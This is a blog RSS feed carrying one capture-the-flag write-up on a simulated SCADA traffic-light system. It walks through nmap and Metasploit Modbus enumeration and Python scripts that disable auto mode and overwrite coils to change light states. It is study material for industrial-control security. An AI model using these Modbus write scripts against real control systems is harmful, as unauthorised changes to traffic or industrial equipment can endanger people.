<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>CTF on drMoscovium Blog</title>
    <link>https://drMoscovium.dev/categories/ctf/</link>
    <description>Recent content in CTF on drMoscovium Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <managingEditor>gautamyojan0@gmail.com (Yojan Gautam)</managingEditor>
    <webMaster>gautamyojan0@gmail.com (Yojan Gautam)</webMaster>
    <lastBuildDate>Sun, 21 Nov 2021 23:22:26 -0500</lastBuildDate><atom:link href="https://drMoscovium.dev/categories/ctf/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HTB UNI CTF : Light The Way</title>
      <link>https://drMoscovium.dev/posts/writeups/htb-uni-ctf/lighttheway/</link>
      <pubDate>Sun, 21 Nov 2021 23:22:26 -0500</pubDate>
      <author>gautamyojan0@gmail.com (Yojan Gautam)</author>
      <guid>https://drMoscovium.dev/posts/writeups/htb-uni-ctf/lighttheway/</guid>
      <description>&lt;p&gt;Light the was a challenge with a medium difficulty level that tested a personâ€™s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/question.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;scada&#34;&gt;SCADA&lt;/h2&gt;
&lt;p&gt;Supervisory control and data acquisition is a system that allows industrial organizations to:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* Conrtol processes
* Monitor
* Interact with devices
* Record events
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&#34;https://inductiveautomation.com/resources/article/what-is-scada&#34;&gt;For more information on SCADA&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;starting-point&#34;&gt;Starting Point&lt;/h2&gt;
&lt;p&gt;For this specific challenge, we needed to compromise traffic lights. There wasn&amp;rsquo;t much information to work with, given only the IP address of the system. It was also in the same network, which makes things easier.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/HMI.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The given IP was : &lt;code&gt;10.129.96.95&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;A website and the IP was all the information that I had. So, where did I begin?&lt;/p&gt;
&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
&lt;p&gt;Yep, nmap. It allows us to scan the system and find information on it.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -p- 10.129.96.95 -sCV
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/nmap.png&#34; alt=&#34;test&#34;&gt;&lt;/p&gt;
&lt;p&gt;Key Points:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* PORT 22 : used for SSH, I wouldn&#39;t even try to attack it
* PORT 80 : running nginx server for the front end
* PORT 502: This is the interesting port. (I didn&#39;t knew it was interesting until I googled and found out that modbus uses it)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After figuring those stuff out, now&amp;rsquo;s the time to enumerate more information on the Modbus.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -p 502 --script modbus-discover 10.129.96.95
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/nmap2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Didn&amp;rsquo;t give much but it confirms that Modbus is running on port 502.&lt;/p&gt;
&lt;h3 id=&#34;more-info&#34;&gt;More info!&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://c.tenor.com/ayUs509YzsIAAAAC/kid-bored.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;What I have here isn&amp;rsquo;t enough to make the exploit. So, what should I do?&lt;/p&gt;
&lt;p&gt;Turning back to my good old friend, internet I found a metaspolit script &lt;code&gt;auxiliary/scanner/scada/modbus_findunitid&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Using the script, I was able to figure out that there are more than one unit in the given SCADA system. I didn&amp;rsquo;t let the script complete, but there are more than 200 units.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Why are there so many?&lt;/strong&gt;&lt;/em&gt;
There are 6 junctions in the picture, and if there are more than 200 does each unit control one light?&lt;/p&gt;
&lt;p&gt;Before answerinng that question let&amp;rsquo;s first look at what data the first unit has.&lt;/p&gt;
&lt;h2 id=&#34;get-data&#34;&gt;Get DATA&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s search if there&amp;rsquo;s any more metaspolit script that we can use.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6&amp;gt; search modbus
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After searching for modbus, I found 6 modules/scripts&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Matching Modules
================

   #  Name                                            Disclosure Date  Rank    Check  Description
   -  ----                                            ---------------  ----    -----  -----------
   0  auxiliary/analyze/modbus_zip                                     normal  No     Extract zip from Modbus communication
   1  auxiliary/scanner/scada/modbus_banner_grabbing                   normal  No     Modbus Banner Grabbing
   2  auxiliary/scanner/scada/modbusclient                             normal  No     Modbus Client Utility
   3  auxiliary/scanner/scada/modbus_findunitid       2012-10-28       normal  No     Modbus Unit ID and Station ID Enumerator
   4  auxiliary/scanner/scada/modbusdetect            2011-11-01       normal  No     Modbus Version Scanner
   5  auxiliary/admin/scada/modicon_stux_transfer     2012-04-05       normal  No     Schneider Modicon Ladder Logic Upload/Download
   6  auxiliary/admin/scada/modicon_command           2012-04-05       normal  No     Schneider Modicon Remote START/STOP Command
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Modbusclient module seems to be the most useful for this case.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6&amp;gt; use auxiliary/scanner/scada/modbusclient
msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; show options
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/meta1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;So the RHOST for this  instance will be the IP address : &lt;code&gt;10.129.96.95&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set RHOST 10.129.96.95
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We need to set where we want to start reading the DATA from to do that we need wo set the DATA_ADDRESS field&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set DATA_ADDRESS 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then we need to set how many DATA_ADDRESS we want to read.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set NUMBER 18
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/meta2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s see what those numbers mean.&lt;/p&gt;
&lt;p&gt;This small python command takes the arr of int and converts to a string.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;arr = [97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 116, 114, 117, 101]

print(&amp;#34;&amp;#34;.join(chr(x) for x in arr))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With the python script I was able to get a string: &lt;code&gt;auto_mode:true&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;setting-it-to-manual&#34;&gt;Setting it to manual&lt;/h2&gt;
&lt;p&gt;If I remember correctly the description of the challenge wants us to set it to manual mode. Which means we need to set the auto_mode to false.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;print([ord(x) for x in &amp;#34;auto_mode:false&amp;#34;])
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Used this python script to get the numbers that we need to send in order to set the SCADA system to false.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 102, 97, 108, 115, 101]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I wrote a simple python script that uses the Perl Modbus library to write to the holding registry.
&lt;img src=&#34;https://c.tenor.com/zOAWdshu_I0AAAAd/boring-unimpressed.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Yea, I later figured out that python had a library to connect to modbus, but anyways it works.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import subprocess

for i in range(1,20):                           #  :  f   a   l   s   e
    cmd = f&amp;#34;modbus write -w -s {i} 10.129.96.95 10 58 102 97 108 115 101&amp;#34;
    subprocess.run(cmd.split(&amp;#34; &amp;#34;))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;modbus {command} {type} {slaveid} {target_ip} {data_address} {information_to_write}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I set it to the first 20 to see if that would make any difference. It didn&amp;rsquo;t make any visual difference. But if I look at the registers again, it changed the values.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/meta3.png&#34; alt=&#34;&#34;&gt;
&lt;em&gt;First one is before running the script, second one is after running the python script.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;So, if that didn&amp;rsquo;t change anything, what can I do?&lt;/p&gt;
&lt;p&gt;Coils also store values, and I can read and write it.&lt;/p&gt;
&lt;h2 id=&#34;reading-coils&#34;&gt;Reading Coils&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; set action READ_COILS
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Reading the first 18 coils, it was all just bunch of 0s so I decided to read 2000 of them to see if I find anything good.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; set NUMBER 2000
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/meta4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;After trying to get 2000 coils, I can see some interesting information. There are bunch of 1 in the middle.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s see what other Units have.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; set UNIT_NUMBER 2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;UNIT_NUMBER determines which slave node we are viewing.&lt;/p&gt;
&lt;p&gt;After looking through 7 to 8 of them I found out that only 6 of it hold any valuable data. So, I concluded that each unit represents one junction.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;from pyModbusTCP.client import ModbusClient

data_address = {}

for i in range(1,7):
    c = ModbusClient(host=&amp;#34;10.129.96.95&amp;#34;, port=&amp;#34;502&amp;#34;, unit_id=i, auto_open=True)

    regs = c.read_coils(0,2000)

    data_address[i] = regs.index(True)

print(data_address)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I wrote this script to get the DATA_ADDRESS of all the 1/True places.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{1: 571, 2: 1921, 3: 531, 4: 1267, 5: 925, 6: 888}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;the-exploit&#34;&gt;The exploit?&lt;/h1&gt;
&lt;p&gt;Now I have all the necessary information on the data address of where they are reading the traffic data from, I can create a payload to change the traffic lights.&lt;/p&gt;
&lt;p&gt;The first three bits represents the North side of the light, and goes in order of&lt;/p&gt;
&lt;p&gt;Green Yellow Red&lt;/p&gt;
&lt;p&gt;IF we curl the api &lt;code&gt;http://10.129.96.95/api&lt;/code&gt; we can see value for all the colors and the direction.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/curl.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;After doing some digging I found out that the API doesn&amp;rsquo;t represent the data in the same way the registers stores the data.&lt;/p&gt;
&lt;p&gt;In the registers we need to pass in data as follow:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;NG NY NR EG EY ER SG SY SR WG WY WR
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/lights.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Looking at the picture we need to change the west side to green because the car is about to turn towards west for the first junction, and we have to turn the East side to Green for the 2nd and 4th junction, and finally the north side for 6th junction.&lt;/p&gt;
&lt;p&gt;So the values for junction one are as follow:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[False, False, True, False, False, True, False, False, True, True, False, False]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will turn on the green light on the west.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[False, False, True, False, False, True, False, False, True, False, False, True]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, What I was saying about the direction didn&amp;rsquo;t make any sense, I had to play around for a long time before I figured out the correct light to turn on. The placement of the lights didn&amp;rsquo;t sense to me, it might be becuase the difference in driving in different country.&lt;/p&gt;
&lt;p&gt;The following script did the job.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;from pyModbusTCP.client import ModbusClient

data_address = {}

c = ModbusClient(host=&amp;#34;10.129.96.95&amp;#34;, port=&amp;#34;502&amp;#34;, unit_id=1, auto_open=True)
for i in range(1,7):
    c.unit_id(i)
    regs = c.read_coils(0,2000)

    data_address[i] = regs.index(True)

c.unit_id(1)
c.write_multiple_coils(571,[False, False, True, False, False, True, False, False, True, True, False, False])

c.unit_id(2)
c.write_multiple_coils(1920, [True, False, False, False, False, True,False, False, True, False, False, True])


c.unit_id(4)
c.write_multiple_coils(1266, [False, False, True, False, False, True,False, False, True, True, False, False])


c.unit_id(6)
c.write_multiple_coils(886,[False, False, True, False, False, True, False, False, True, True, False, False])
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After running the script, the car moved and I found the flag.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/lighttheway.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Flag:&lt;code&gt;HTB{w3_se3_tH3_l1ght}&lt;/code&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
